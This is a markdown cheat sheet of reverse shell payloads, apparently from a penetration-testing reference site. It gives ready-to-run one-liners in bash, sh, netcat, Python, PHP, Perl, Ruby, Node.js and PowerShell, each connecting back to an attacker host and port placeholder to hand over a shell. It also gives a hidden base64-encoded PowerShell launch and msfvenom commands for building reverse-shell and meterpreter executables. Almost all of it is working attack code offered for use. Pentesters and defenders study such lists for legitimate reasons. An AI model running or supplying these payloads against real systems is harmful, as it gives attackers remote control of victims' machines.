---
title: Reverse Shell Payloads
category: reverse-shells
description: One-liners for every common runtime.
tags: [reverse-shell, payload]
os: [any]
order: 10
---

## Listener

```bash
nc -lvnp {{LPORT}}
rlwrap nc -lvnp {{LPORT}}     # arrow keys + history
# Better: pwncat-cs / pwncat
pwncat-cs -lp {{LPORT}}
```

## Bash

```bash
bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'
bash -c '0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; sh <&196 >&196 2>&196'
```

## /dev/tcp w/o bash

```bash
sh -i 5<> /dev/tcp/{{LHOST}}/{{LPORT}} 0<&5 1>&5 2>&5
```

## Netcat variants

```bash
nc -e /bin/sh {{LHOST}} {{LPORT}}
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f
busybox nc {{LHOST}} {{LPORT}} -e /bin/sh
ncat --ssl {{LHOST}} {{LPORT}} -e /bin/bash
```

## Python

```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## PHP

```bash
php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Perl

```bash
perl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Ruby

```bash
ruby -rsocket -e 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{{LHOST}}",{{LPORT}}))'
```

## Node.js

```bash
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=new net.Socket();c.connect({{LPORT}},"{{LHOST}}",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})();'
```

## Powershell (Windows)

```powershell
$c=New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

Encoded one-liner:

```cmd
powershell -nop -w hidden -enc <BASE64>
```

Generate base64 (UTF-16LE on Linux):

```bash
echo -n '<your ps1>' | iconv -f UTF8 -t UTF16LE | base64 -w0
```

## msfvenom (when nothing else fits)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf -o sh.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o sh.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST={{LHOST}} LPORT={{LPORT}} -f exe -o m.exe
msfvenom -p cmd/unix/reverse_bash LHOST={{LHOST}} LPORT={{LPORT}}
```

## Webhook / cheat reference

[revshells.com](https://www.revshells.com/) — generator with IP/port/encoding presets.
